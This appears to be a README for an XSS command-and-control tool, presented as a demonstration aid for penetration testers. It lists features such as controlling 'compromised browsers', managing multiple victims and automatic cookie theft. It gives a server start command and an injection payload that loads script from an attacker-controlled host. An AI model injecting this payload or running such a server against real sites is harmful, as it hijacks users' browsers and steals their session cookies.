<div align="left"><h1>Advanced Cross-Site Scripting Command & Control Server</h1></div><br>
🕷️ XSS-commander is a professional-grade Command and Control server designed for security researchers and penetration testers to demonstrate the real-world impact of XSS vulnerabilities. It provides real-time browser control through injected JavaScript payloads with an intuitive web interface.

<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong>⚠️ LEGAL NOTICE:</strong> This tool is for <strong>authorized security testing</strong> and <strong>educational purposes</strong> only. Unauthorized use is illegal. </div><br>
<table style="width: 100%; border-collapse: collapse;"> <thead> <tr style="background: #f5f5f5;"> <th style="padding: 12px; text-align: left; border-bottom: 2px solid #ddd;">Feature</th> <th style="padding: 12px; text-align: left; border-bottom: 2px solid #ddd;">Description</th> </tr> </thead> <tbody> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🎯 <strong>Real-time Control</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Execute JavaScript commands on compromised browsers</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">📊 <strong>Web Dashboard</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Beautiful admin interface with live results</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">👥 <strong>Multi-Victim</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Manage multiple browser sessions simultaneously</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🔍 <strong>Auto Recon</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Automatic information gathering (cookies, IP, user agent)</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">⚡ <strong>Quick Commands</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">One-click common reconnaissance tasks</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🛡️ <strong>CORS Ready</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Bypasses modern browser security policies</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">📱 <strong>Responsive</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Works on desktop and mobile</td> </tr> </tbody> </table><br>

## How to use:
<div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 1.🔧 Start the Server</strong></div><br>

```bash
python3 xss-commander.py [--help] [-h HOST] [-p PORT]

optional arguments:
  --help            show this help message and exit
  -h HOST, --host HOST  Server IP address (default: 0.0.0.0 - all interfaces)
  -p PORT, --port PORT  Server port (default: 4545)
```
<div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 2.🌐 Access Control Panel</strong></div>

Open your browser and navigate to:
 ```bash
http://YOUR_IP:YOUR_PORT/admin
```
<div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 3.🚀 Inject XSS Payload</strong></div>

Inject the following payload into vulnerable web applications:
 ```bash
<script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
```


